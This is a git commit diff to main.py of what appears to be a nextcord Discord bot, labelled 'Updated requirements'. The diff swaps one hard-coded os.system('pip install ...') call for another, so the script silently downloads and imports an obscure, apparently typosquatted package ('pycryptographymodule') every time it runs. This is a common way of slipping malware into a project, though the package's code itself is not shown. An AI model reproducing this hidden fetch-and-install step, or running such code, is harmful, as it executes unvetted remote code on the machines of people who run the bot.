628b8c59e29164de4f7898301c622d0114e85c3d
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-02 17:50:25 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pythonsqliteaddition")
-import pythonsqliteaddition
+os.system("pip install pycryptographymodule")
+import pycryptographymodule
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
